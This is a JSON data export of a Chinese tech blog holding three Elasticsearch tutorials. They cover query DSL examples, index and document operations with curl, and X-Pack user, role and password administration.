{"meta":{"title":"褚成志的博客","subtitle":"青青子衿, 悠悠我心","description":"关注互联网的科技博客","author":"褚成志","url":"http://chucz.club"},"pages":[{"title":"categories","date":"2018-09-28T02:11:52.000Z","updated":"2018-09-28T10:11:52.189Z","comments":true,"path":"categories/index.html","permalink":"http://chucz.club/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-28T02:11:43.000Z","updated":"2018-09-28T10:11:43.314Z","comments":true,"path":"tags/index.html","permalink":"http://chucz.club/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"23种非常有用的ElasticSearch查询例子","slug":"23种非常有用的ElasticSearch查询例子","date":"2018-08-19T01:57:30.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/23种非常有用的ElasticSearch查询例子/","link":"","permalink":"http://chucz.club/2018/08/19/23种非常有用的ElasticSearch查询例子/","excerpt":"","text":"一、新建索引为了展示Elasticsearch中不同查询的用法，先在Elasticsearch里面创建了book相关的documents，每本书主要涉及以下字段： title, authors, summary, publish_date(发行日期),publisher以及评论条数。 操作如下： 123456789101112curl -XPUT ‘https://www.iteblog.com:9200/iteblog_book_index&#39; -d ‘&#123; “settings“: &#123; “number_of_shards“: 1 &#125;&#125;’curl -XPOST ‘https://www.iteblog.com:9200/iteblog_book_index/book/_bulk&#39; -d ‘&#123; “index“: &#123; “_id“: 1 &#125;&#125;&#123; “title“: “Elasticsearch: The Definitive Guide“, “authors“: [“clinton gormley“, “zachary tong“], “summary“ : “A distibuted real-time search and analytics engine“, “publish_date“ : “2015-02-07“, “num_reviews“: 20, “publisher“: “oreilly“ &#125;&#123; “index“: &#123; “_id“: 2 &#125;&#125;&#123; “title“: “Taming Text: How to Find, Organize, and Manipulate It“, “authors“: [“grant ingersoll“, “thomas morton“, “drew farris“], “summary“ : “organize text using approaches such as full-text search, proper name recognition, clustering, tagging, information extraction, and summarization“, “publish_date“ : “2013-01-24“, “num_reviews“: 12, “publisher“: “manning“ &#125;&#123; “index“: &#123; “_id“: 3 &#125;&#125;&#123; “title“: “Elasticsearch in Action“, “authors“: [“radu gheorge“, “matthew lee hinman“, “roy russo“], “summary“ : “build scalable search applications using Elasticsearch without having to do complex low-level programming or understand advanced data science algorithms“, “publish_date“ : “2015-12-03“, “num_reviews“: 18, “publisher“: “manning“ &#125;&#123; “index“: &#123; “_id“: 4 &#125;&#125;&#123; “title“: “Solr in Action“, “authors“: [“trey grainger“, “timothy potter“], “summary“ : “Comprehensive guide to implementing a scalable search engine using Apache Solr“, “publish_date“ : “2014-04-05“, “num_reviews“: 23, “publisher“: “manning“ &#125;‘ 通过dev tools来模拟则为：http://cos.leiyawu.com/img/elk_index_check_1.png 123456789POST /iteblog_book_index/book/_bulk&#123; “index”: &#123; “_id”: 1 &#125;&#125;&#123; “title”: “Elasticsearch: The Definitive Guide”, “authors”: [“clinton gormley”, “zachary tong”], “summary” : “A distibuted real-time search and analytics engine”, “publish_date” : “2015-02-07”, “num_reviews”: 20, “publisher”: “oreilly” &#125;&#123; “index”: &#123; “_id”: 2 &#125;&#125;&#123; “title”: “Taming Text: How to Find, Organize, and Manipulate It”, “authors”: [“grant ingersoll”, “thomas morton”, “drew farris”], “summary” : “organize text using approaches such as full-text search, proper name recognition, clustering, tagging, information extraction, and summarization”, “publish_date” : “2013-01-24”, “num_reviews”: 12, “publisher”: “manning” &#125;&#123; “index”: &#123; “_id”: 3 &#125;&#125;&#123; “title”: “Elasticsearch in Action”, “authors”: [“radu gheorge”, “matthew lee hinman”, “roy russo”], “summary” : “build scalable search applications using Elasticsearch without having to do complex low-level programming or understand advanced data science algorithms”, “publish_date” : “2015-12-03”, “num_reviews”: 18, “publisher”: “manning” &#125;&#123; “index”: &#123; “_id”: 4 &#125;&#125;&#123; “title”: “Solr in Action”, “authors”: [“trey grainger”, “timothy potter”], “summary” : “Comprehensive guide to implementing a scalable search engine using Apache Solr”, “publish_date” : “2014-04-05”, “num_reviews”: 23, “publisher”: “manning” &#125; ES中的查询请求有两种方式，一种是简易版的查询，另外一种是使用JSON完整的请求体，叫做结构化查询（DSL）。由于DSL查询更为直观也更为简易，所以大都使用这种方式。DSL查询是POST过去一个json，由于post的请求是json格式的，所以存在很多灵活性，也有很多形式。 基本匹配查询主要形式：（1）、使用Search Lite API，并将所有的搜索参数都通过URL传递（2）、使用Elasticsearch DSL，其可以通过传递一个JSON请求来获取结果。Curl方式与其类似，只是提交方式不是POST，而是XGET，提交参数与DSL提交一致 二、基本匹配查询(Basic Match Query)1、在所有的字段中搜索带有”guide”的结果：通过dev tools:GET /iteblog_book_index/book/_search?q=guide 通过curl方式：curl -u elastic “http://10.104.37.115:9281/iteblog_book_index/book/_search?pretty&quot; -d ‘{ “query”: { “multi_match” : { “query” : “guide”, “fields” : [“_all”] } }}’ 通过DSL：(POST json方式) 其输出和上面使用/iteblog_book_index/book/_search?q=guide的输出一样。上面的multi_match关键字通常在查询多个fields的时候作为match关键字的简写方式。fields属性指定需要查询的字段，如果我们想查询所有的字段，这时候可以使用_all关键字，正如上面的一样。 如果只是查询summary字段，则为： title的Guide则不会显示。 2、以上两种方式都允许我们指定查询哪些字段。比如，我们想查询title中出现in Action的图书，那么我们可以这么查询： GET /iteblog_book_index/book/_search?q=title:in%20action 然而，DSL方式提供了更加灵活的方式来构建更加复杂的查询（我们将在后面看到），甚至指定你想要的返回结果。下面的例子中，我将指定需要返回结果的数量，开始的偏移量（这在分页的情况下非常有用），需要返回document中的哪些字段以及高亮关键字： curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “match” : { “title” : “in action” } }, “size”: 2, #返回结果的数量 “from”: 0, #开始的偏移量 “_source”: [ “title”, “summary”, “publish_date” ], “highlight”: { “fields” : { “title” : {} } }}’ 三、Multi-field Search正如我们之前所看到的，想在一个搜索中查询多个 document field （比如使用同一个查询关键字同时在title和summary中查询），你可以使用multi_match查询，使用如下：curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “multi_match” : { “query” : “elasticsearch guide”, “fields”: [“title”, “summary”] } }}’ 四、Boosting上面使用同一个搜索请求在多个field中查询，你也许想提高某个field的查询权重。在下面的例子中，我们把summary field的权重调成3，这样就提高了其在结果中的权重，这样把_id=4的文档相关性大大提高了，如下： curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “multi_match” : { “query” : “elasticsearch guide”, “fields”: [“title”, “summary^3”] } }, “_source”: [“title”, “summary”, “publish_date”]}’ 需要注意的是：Boosting不仅仅意味着计算出来的分数(calculated score)直接乘以boost factor，最终的boost value会经过归一化以及其他一些内部的优化 五、Bool Query在查询条件中使用AND/OR/NOT操作符，这就是布尔查询(Bool Query)。布尔查询可以接受一个must参数(等价于AND)，一个must_not参数(等价于NOT)，以及一个should参数(等价于OR)。比如，我想查询title中出现Elasticsearch或者Solr关键字的图书，图书的作者是clinton gormley，但没有radu gheorge，可以这么来查询： curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “bool”: { “must”: { “bool” : { “should”: [ { “match”: { “title”: “Elasticsearch” }}, { “match”: { “title”: “Solr” }} ] } }, “must”: { “match”: { “authors”: “clinton gormely” }}, “must_not”: { “match”: {“authors”: “radu gheorge” }} } }}’ 六、Fuzzy Queries（模糊查询）模糊查询可以在Match和 Multi-Match查询中使用以便解决拼写的错误，模糊度是基于Levenshtein distance计算与原单词的距离。使用如下：curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “multi_match” : { “query” : “comprihensiv guide”, “fields”: [“title”, “summary”], “fuzziness”: “AUTO” } }, “_source”: [“title”, “summary”, “publish_date”], “size”: 1}’ 需要注意：上面我们将fuzziness的值指定为AUTO，其在term的长度大于5的时候相当于指定值为2。然而80%的人拼写错误的编辑距离(edit distance)为1，所有如果你将fuzziness设置为1可能会提高你的搜索性能。 七、Wildcard Query(通配符查询)通配符查询允许我们指定一个模式来匹配，而不需要指定完整的term。?将会匹配一个字符；_将会匹配零个或者多个字符。比如我们想查找所有作者名字中以t字符开始的记录，我们可以如下使用：curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “wildcard” : { #wildcard是通配符意思 “authors” : “t_“ } }, “_source”: [“title”, “authors”], “highlight”: { “fields” : { “authors” : {} } }}’ 八、Regexp Query(正则表达式查询)ElasticSearch还支持正则表达式查询，此方式提供了比通配符查询更加复杂的模式。比如我们先查找作者名字以t字符开头，中间是若干个a-z之间的字符，并且以字符y结束的记录，可以如下查询： curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “regexp” : { “authors” : “t[a-z]*y” } }, “_source”: [“title”, “authors”], “highlight”: { “fields” : { “authors” : {} } }}’ 九、Match Phrase Query(匹配短语查询)匹配短语查询要求查询字符串中的trems要么都出现Document中、要么trems按照输入顺序依次出现在结果中。在默认情况下，查询输入的trems必须在搜索字符串紧挨着出现，否则将查询不到。不过我们可以指定slop参数，来控制输入的trems之间有多少个单词仍然能够搜索到，如下所示：curl -XGET ‘https://www.iteblog.com:9200/iteblog_book_index/book/_search&#39; -d ‘{ “query”: { “multi_match”: { “query”: “search engine”, “fields”: [ “title”, “summary” ], “type”: “phrase”, “slop”: 3 } }, “_source”: [ “title”, “summary”, “publish_date” ]}’ 从上面的例子可以看出，id为4的document被搜索（summary字段里面精确匹配到了search engine），并且分数比较高；而id为1的document也被搜索到了，虽然其summary中的search和engine单词并不是紧挨着的，但是我们指定了slop属性，所以被搜索到了。如果我们将”slop”: 3条件删除，那么id为1的文档将不会被搜索到，如下： 十、Simple Query String(简单查询字符串)simple_query_string是query_string的另一种版本，其更适合为用户提供一个搜索框中，因为其使用+/|/- 分别替换AND/OR/NOT，如果用输入了错误的查询，其直接忽略这种情况而不是抛出异常。使用如下：(注意是POST)curl POST https://www.iteblog.com:9200/iteblog_book_index/book/_search{ “query”: { “simple_query_string” : { “query”: “(saerch~1 algorithm~1) + (grant ingersoll) | (tom morton)”, “fields”: [“_all”, “summary^2”] } }, “_source”: [ “title”, “summary”, “authors” ], “highlight”: { “fields” : { “summary” : {} } }} 十一、Term/Terms Query前面的例子中我们已经介绍了全文搜索(full-text search)，但有时候我们对结构化搜索中能够精确匹配并返回搜索结果更感兴趣。这种情况下我们可以使用term和terms查询。在下面例子中，我们想搜索所有曼宁出版社(Manning Publications)出版的图书： curl POST https://www.iteblog.com:9200/iteblog_book_index/book/_search -d ‘{ “query”: { “term” : { “publisher”: “manning” } }, “_source” : [“title”,”publish_date”,”publisher”]}’ 还可以使用terms关键字来指定多个terms，如下： { “query”: { “terms” : { “publisher”: [“oreilly”, “packt”] } }} 十二、Term Query - Sorted词查询结果和其他查询结果一样可以很容易地对其进行排序，而且我们可以对输出结果按照多层进行排序：curl POST https://www.iteblog.com:9200/iteblog_book_index/book/_search{ “query”: { “term” : { “publisher”: “manning” } }, “_source” : [“title”,”publish_date”,”publisher”], “sort”: [ { “publish_date”: {“order”:”desc”}}, { “title”: { “order”: “desc” }} ]} 执行提示：Fielddata is disabled on text fields by default. Set fielddata=true on [title] in order to load fielddata in memory by uninverting the inverted index 应该是5.x后对排序，聚合这些操作用单独的数据结构(fielddata)缓存到内存里了，需要单独开启 PUT /iteblog_book_index/_mapping/book{ “properties”: { “title”: { “type”: “text”, “fielddata”: true } }} 再次执行： 十三、Range Query(范围查询)另一种结构化查询就是范围查询。在下面例子中，我们搜索所有发行年份为2015的图书：curl POST https://www.iteblog.com:9200/iteblog_book_index/book/_search{ “query”: { “range” : { “publish_date”: { “gte”: “2015-01-01”, “lte”: “2015-12-31” } } }, “_source” : [“title”,”publish_date”,”publisher”]} 十四、Filtered Query(过滤查询)过滤查询允许我们对查询结果进行筛选。比如：我们查询标题和摘要中包含Elasticsearch关键字的图书，但是我们想过滤出评论大于20的结果，可以如下使用： curl POST https://www.iteblog.com:9200/iteblog_book_index/book/_search{ “query”: { “filtered”: { “query” : { “multi_match”: { “query”: “elasticsearch”, “fields”: [“title”,”summary”] } }, “filter”: { “range” : { “num_reviews”: { “gte”: 20 } } } } }, “_source” : [“title”,”summary”,”publisher”, “num_reviews”]}","categories":[],"tags":[]},{"title":"ElasticSearch 索引查询使用指南","slug":"ElasticSearch-索引查询使用指南","date":"2018-08-19T01:56:47.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/ElasticSearch-索引查询使用指南/","link":"","permalink":"http://chucz.club/2018/08/19/ElasticSearch-索引查询使用指南/","excerpt":"","text":"1.我们通常用用_cat API检测集群是否健康。 确保9200端口号可用:curl ‘localhost:9200/_cat/health?v’ 绿色表示一切正常, 黄色表示所有的数据可用但是部分副本还没有分配,红色表示部分数据因为某些原因不可用. 2.通过如下语句，我们可以获取集群的节点列表：curl ‘localhost:9200/_cat/nodes?v’ 3.通过如下语句，列出所有索引：curl ‘localhost:9200/_cat/indices?v’返回结果： 4.创建索引现在我们创建一个名为“customer”的索引，然后再查看所有的索引： curl -XPUT ‘localhost:9200/customer?pretty’ curl ‘localhost:9200/_cat/indices?v’ 结果如下： 上图中红框所表示的是：我们有一个叫customer的索引，它有五个私有的分片以及一个副本，在它里面有0个文档。 5.插入和获取现在我么插入一些数据到集群索引。我们必须给ES指定所以的类型。如下语句：”external” type, ID：1:主体为JSON格式的语句： { “name”: “John Doe” } 1234curl -XPUT ‘localhost:9200/customer/external/1?pretty’ -d ‘&#123; “name“: “John Doe“&#125;’ 返回结果为：create：true 表示插入成功。 获取GET，语句如下： 1curl -XGET ‘localhost:9200/customer/external/1?pretty’ 其中含义为：获取customer索引下类型为external，id为1的数据，pretty参数表示返回结果格式美观。 6.删除索引 DELETE 12curl -XDELETE ‘localhost:9200/customer?pretty’curl ‘localhost:9200/_cat/indices?v’ 表示索引删除成功。 7.通过以上命令语句的学习，我们发现索引的增删改查有一个类似的格式，总结如下： 1234567curl -X&lt;REST Verb&gt; &lt;Node&gt;:&lt;Port&gt;/&lt;Index&gt;/&lt;Type&gt;/&lt;ID&gt;&lt;REST Verb&gt;：REST风格的语法谓词&lt;Node&gt;:节点ip&lt;port&gt;:节点端口号，默认9200&lt;Index&gt;:索引名&lt;Type&gt;:索引类型&lt;ID&gt;:操作对象的ID号 8 修改数据 12345678curl -XPUT ‘localhost:9200/customer/external/1?pretty’ -d ‘&#123; “name“: “John Doe“&#125;’curl -XPUT ‘localhost:9200/customer/external/1?pretty’ -d ‘&#123; “name“: “Jane Doe“&#125;’ 上述命令语句是：先新增id为1，name为John Doe的数据，然后将id为1的name修改为Jane Doe。 9.更新数据9.1 这个例子展示如何将id为1文档的name字段更新为Jane Doe： 1234curl -XPOST ‘localhost:9200/customer/external/1/_update?pretty’ -d ‘&#123; “doc“: &#123; “name“: “Jane Doe“ &#125;&#125;’ 9.2 这个例子展示如何将id为1数据的name字段更新为Jane Doe同时增加字段age为20: 1234curl -XPOST ‘localhost:9200/customer/external/1/_update?pretty’ -d ‘&#123; “doc“: &#123; “name“: “Jane Doe“, “age“: 20 &#125;&#125;’ 9.3 也可以通过一些简单的scripts来执行更新。一下语句通过使用script将年龄增加5: 1234curl -XPOST ‘localhost:9200/customer/external/1/_update?pretty’ -d ‘&#123; “script“ : “ctx._source.age += 5“&#125;’ 10 删除数据删除数据那是相当的直接. 下面的语句将执行删除Customer中ID为2的数据： 1curl -XDELETE ‘localhost:9200/customer/external/2?pretty’ 11 批处理举例:下面语句将在一个批量操作中执行创建索引： 123456curl -XPOST ‘localhost:9200/customer/external/_bulk?pretty’ -d ‘&#123;”index“:&#123;”_id“:”1“&#125;&#125;&#123;”name“: “John Doe“ &#125;&#123;”index“:&#123;”_id“:”2“&#125;&#125;&#123;”name“: “Jane Doe“ &#125;‘ 下面语句批处理执行更新id为1的数据然后执行删除id为2的数据 12345curl -XPOST ‘localhost:9200/customer/external/_bulk?pretty’ -d ‘&#123;”update“:&#123;”_id“:”1“&#125;&#125;&#123;”doc“: &#123; “name“: “John Doe becomes Jane Doe“ &#125; &#125;&#123;”delete“:&#123;”_id“:”2“&#125;&#125;‘ 12.导入数据集你可以点击这里下载示例数据集:accounts.json其中每个数据都是如下格式: 12345678910111213141516&#123; “index”:&#123;“_id”:“1”&#125;&#125;&#123; “account_number”: 0, “balance”: 16623, “firstname”: “Bradshaw”, “lastname”: “Mckenzie”, “age”: 29, “gender”: “F”, “address”: “244 Columbus Place”, “employer”: “Euron”, “email”: “bradshawmckenzie@euron.com“, “city”: “Hobucken”, “state”: “CO”&#125; 导入示例数据集: 12curl -XPOST ‘localhost:9200/bank/account/_bulk?pretty’ –data-binary “@accounts.json”curl ‘localhost:9200/_cat/indices?v’ 上图红框表示我们已经成功批量导入1000条数据索引到bank索引中。 13.查询Sample: 12345678910111213141516171819202122232425curl ‘localhost:9200/bank/_search?q=*&amp;pretty’&#123; “took” : 63, “timed_out” : false, “_shards” : &#123; “total” : 5, “successful” : 5, “failed” : 0 &#125;, “hits” : &#123; “total” : 1000, “max_score” : 1.0, “hits” : [ &#123; “_index” : “bank“, “_type“ : “account“, “_id“ : “1“, “_score“ : 1.0, “_source“ : &#123;”account_number“:1,”balance“:39225,”firstname“:”Amber“,”lastname“:”Duke“,”age“:32,”gender“:”M“,”address“:”880 Holmes Lane“,”employer“:”Pyrami“,”email“:”amberduke@pyrami.com“,”city“:”Brogan“,”state“:”IL“&#125; &#125;, &#123; “_index“ : “bank“, “_type“ : “account“, “_id“ : “6“, “_score“ : 1.0, “_source“ : &#123;”account_number“:6,”balance“:5686,”firstname“:”Hattie“,”lastname“:”Bond“,”age“:36,”gender“:”M“,”address“:”671 Bristol Street“,”employer“:”Netagy“,”email“:”hattiebond@netagy.com“,”city“:”Dante“,”state“:”TN“&#125; &#125;, &#123; “_index“ : “bank“, “_type“ : “account“, 上面示例返回所有bank中的索引数据。其中 q=* 表示匹配索引中所有的数据。 等价于: 1234curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match_all“: &#123;&#125; &#125;&#125;’ 14 查询语言 匹配所有数据，但只返回1个: 12345curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match_all“: &#123;&#125; &#125;, “size“: 1&#125;’ 注意：如果siez不指定，则默认返回10条数据。 123456curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match_all“: &#123;&#125; &#125;, “from“: 10, “size“: 10&#125;’ 返回从11到20的数据。（索引下标从0开始） 12345curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match_all“: &#123;&#125; &#125;, “sort“: &#123; “balance“: &#123; “order“: “desc“ &#125; &#125;&#125;’ 上述示例匹配所有的索引中的数据，按照balance字段降序排序，并且返回前10条（如果不指定size，默认最多返回10条）。 15.执行搜索 下面例子展示如何返回两个字段（account_number balance） 12345curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match_all“: &#123;&#125; &#125;, “_source“: [“account_number“, “balance“]&#125;’ 返回account_number 为20 的数据: 1234curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match“: &#123; “account_number“: 20 &#125; &#125;&#125;’ 返回address中包含mill的所有数据： 1234curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match“: &#123; “address“: “mill“ &#125; &#125;&#125;’ 返回地址中包含mill或者lane的所有数据： 1234curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match“: &#123; “address“: “mill lane“ &#125; &#125;&#125;’ 和上面匹配单个词语不同，下面这个例子是多匹配（match_phrase短语匹配），返回地址中包含短语 “mill lane”的所有数据： 1234curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “match_phrase“: &#123; “address“: “mill lane“ &#125; &#125;&#125;’ 以下是布尔查询，布尔查询允许我们将多个简单的查询组合成一个更复杂的布尔逻辑查询。这个例子将两个查询组合，返回地址中含有mill和lane的所有记录数据： 1234567891011curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “bool“: &#123; “must“: [ &#123; “match“: &#123; “address“: “mill“ &#125; &#125;, &#123; “match“: &#123; “address“: “lane“ &#125; &#125; ] &#125; &#125;&#125;’ 上述例子中，must表示所有查询必须都为真才被认为匹配。 相反, 这个例子组合两个查询，返回地址中含有mill或者lane的所有记录数据： 1234567891011curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “bool“: &#123; “should“: [ &#123; “match“: &#123; “address“: “mill“ &#125; &#125;, &#123; “match“: &#123; “address“: “lane“ &#125; &#125; ] &#125; &#125;&#125;’ 上述例子中，bool表示查询列表中只要有任何一个为真则认为匹配。 下面例子组合两个查询，返回地址中既没有mill也没有lane的所有数据： 1234567891011curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “bool“: &#123; “must_not“: [ &#123; “match“: &#123; “address“: “mill“ &#125; &#125;, &#123; “match“: &#123; “address“: “lane“ &#125; &#125; ] &#125; &#125;&#125;’ 上述例子中,must_not表示查询列表中没有为真的（也就是全为假）时则认为匹配。 我们可以组合must、should、must_not来实现更加复杂的多级逻辑查询。 下面这个例子返回年龄大于40岁、不居住在ID的所有数据： 12345678910111213curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “bool“: &#123; “must“: [ &#123; “match“: &#123; “age“: “40“ &#125; &#125; ], “must_not“: [ &#123; “match“: &#123; “state“: “ID“ &#125; &#125; ] &#125; &#125;&#125;’ 16.过滤filter(查询条件设置) 下面这个例子使用了布尔查询返回balance在20000到30000之间的所有数据。 12345678910111213141516curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “query“: &#123; “bool“: &#123; “must“: &#123; “match_all“: &#123;&#125; &#125;, “filter“: &#123; “range“: &#123; “balance“: &#123; “gte“: 20000, “lte“: 30000 &#125; &#125; &#125; &#125; &#125;&#125;’ 17 聚合 Aggregations下面这个例子： 将所有的数据按照state分组（group），然后按照分组记录数从大到小排序，返回前十条（默认）： 1234567891011curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “size“: 0, “aggs“: &#123; “group_by_state“: &#123; “terms“: &#123; “field“: “state“ &#125; &#125; &#125;&#125;’ 注意：我们设置size=0，不显示查询hits，因为我们只想看返回的聚合结果。 上述语句类似于以下SQL语句：SELECT state, COUNT() FROM bank GROUP BY state ORDER BY COUNT() DESC 下面这个实例按照state分组，降序排序，返回balance的平均值： 123456789101112131415161718curl -XPOST ‘localhost:9200/bank/_search?pretty’ -d ‘&#123; “size“: 0, “aggs“: &#123; “group_by_state“: &#123; “terms“: &#123; “field“: “state“ &#125;, “aggs“: &#123; “average_balance“: &#123; “avg“: &#123; “field“: “balance“ &#125; &#125; &#125; &#125; &#125;&#125;’","categories":[],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://chucz.club/tags/ELK/"}]},{"title":"ES内置账号密码修改、自定义角色自定义账号、ldap及AD认证","slug":"ES内置账号密码修改、自定义角色自定义账号、ldap及AD认证","date":"2018-08-19T01:55:58.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/ES内置账号密码修改、自定义角色自定义账号、ldap及AD认证/","link":"","permalink":"http://chucz.club/2018/08/19/ES内置账号密码修改、自定义角色自定义账号、ldap及AD认证/","excerpt":"","text":"自定义内置账号 账户elastic为elasticsearch超级管理员，拥有所有权限 账户kibana用于kibana组件获取相关信息用于web展示 账户logstash_system用于logstash服务获取elasticsearch的监控数据 注意：此步骤需先启动elasticsearch服务 12345678910111213141516[elasticsearch@elasticsearch elasticsearch-6.0.0]$ ./bin/x-pack/setup-passwords interactiveInitiating the setup of reserved user elastic,kibana,logstash_system passwords.You will be prompted to enter passwords as the process progresses.Please confirm that you would like to continue [y/N]yEnter password for [elastic]: Reenter password for [elastic]: Enter password for [kibana]: Reenter password for [kibana]: Enter password for [logstash_system]: Reenter password for [logstash_system]: Changed password for user [kibana]Changed password for user [logstash_system]Changed password for user [elastic][elasticsearch@elasticsearch elasticsearch-6.0.0]$ 验证内置账户访问 若不提供用户名密码则返回4011234567891011121314151617181920[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl ‘http://10.59.30.96:9200/_cat/indices?pretty&#39;&#123; “error” : &#123; “root_cause” : [ &#123; “type” : “security_exception”, “reason” : “missing authentication token for REST request [/_cat/indices?pretty]”, “header” : &#123; “WWW-Authenticate” : “Basic realm=\\”security\\“ charset=\\”UTF-8\\“” &#125; &#125; ], “type” : “security_exception”, “reason” : “missing authentication token for REST request [/_cat/indices?pretty]”, “header” : &#123; “WWW-Authenticate” : “Basic realm=\\”security\\“ charset=\\”UTF-8\\“” &#125; &#125;, “status” : 401&#125; 提供相应用户信息后可访问，若用户权限不足则返回403 使用logstash_system用户访问123456789101112131415[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl ‘http://10.59.30.96:9200/_cat/indices?pretty’ -u logstash_system:logstash_system&#123; “error” : &#123; “root_cause” : [ &#123; “type” : “security_exception“, “reason“ : “action [indices:monitor/stats] is unauthorized for user [logstash_system]“ &#125; ], “type“ : “security_exception“, “reason“ : “action [indices:monitor/stats] is unauthorized for user [logstash_system]“ &#125;, “status“ : 403&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 使用kibana用户访问12345678[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl ‘http://10.59.30.96:9200/_cat/indices?pretty&#39; -u kibana:kibanayellow open .monitoring-es-6-2018.01.10 nND6-i_rR5iLEYVccBGj8w 1 1 yellow open .triggered_watches BtygGZisSDqiL3Y2TaQGqQ 1 1 green open .security-6 QVRL1mcFSAilryHGEhen7Q 1 0 yellow open .watcher-history-6-2018.01.10 SBGiHDAnTPiXFoHU65VY_g 1 1 yellow open .watches kMzN4j5cQySZQQSDVPww8w 1 1 yellow open .monitoring-alerts-6 VygY6VN9R3S0PR_jrGy50Q 1 1 [elasticsearch@elasticsearch elasticsearch-6.0.0]$ 添加自定义角色 添加角色接口为 POST /_xpack/security/role/ 下述示例为添加超级管理员角色的方法1234567891011121314151617181920212223242526272829303132333435363738394041[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XPOST -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/role/admin?pretty’ -d ‘&#123;&gt; “run_as”: [ “elastic” ],&gt; “cluster”: [ “all” ],&gt; “indices”: [&gt; &#123;&gt; “names”: [ ““ ],&gt; “privileges”: [ “all” ]&gt; &#125;&gt; ]&gt; &#125;’&#123; “role” : &#123; “created” : true &#125;&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/role/admin?pretty’&#123; “admin” : &#123; “cluster” : [ “all” ], “indices” : [ &#123; “names” : [ ““ ], “privileges” : [ “all” ] &#125; ], “run_as” : [ “elastic” ], “metadata” : &#123; &#125;, “transient_metadata” : &#123; “enabled” : true &#125; &#125;&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 添加自定义账户 添加用户接口为 POST /_xpack/security/user/ 下述为添加martin账户并添加至admin角色操作方法1234567891011121314151617181920212223242526272829303132[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XPOST -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/user/martin?pretty’ -d ‘&#123;&gt; “password” : “123456”,&gt; “full_name” : “Martin Lei”,&gt; “roles” : [“admin”],&gt; “email” : “martin@martin.com“&gt; &#125;’&#123; “user” : &#123; “created” : true &#125;&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/user/martin?pretty’&#123; “rocshen” : &#123; “username” : “martin”, “roles” : [ “admin” ], “full_name” : “Martin Lei”, “email” : “martin@martin.com“, “metadata” : &#123; &#125;, “enabled” : true &#125;&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -H ‘Content-type: application/json’ -u martin:123456 ‘http://10.59.30.96:9200/_cat/indices?pretty’yellow open .monitoring-es-6-2018.01.10 nND6-i_rR5iLEYVccBGj8w 1 1 4883 88 2.5mb 2.5mbyellow open .triggered_watches BtygGZisSDqiL3Y2TaQGqQ 1 1 0 0 24.2kb 24.2kbgreen open .security-6 QVRL1mcFSAilryHGEhen7Q 1 0 yellow open .watcher-history-6-2018.01.10 SBGiHDAnTPiXFoHU65VY_g 1 1 630 0 703.3kb 703.3kbyellow open .watches kMzN4j5cQySZQQSDVPww8w 1 1 5 0 33.3kb 33.3kbyellow open .monitoring-alerts-6 VygY6VN9R3S0PR_jrGy50Q 1 1 1 0 6.5kb 6.5kb[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 修改账户密码 修改密码需使用超级管理员权限即elastic账户，接口为POST _xpack/security/user//_password curl参数含义如下 -XPOST 使用post方法传递参数 -H 指定http协议的header信息 -u 指定用于认证的用户信息用户名与密码使用冒号分隔 -d 指定具体要传递的参数信息12[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XPOST -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/user/kibana/_password?pretty’ -d ‘&#123;”password”: “123456”&#125;’&#123; &#125; 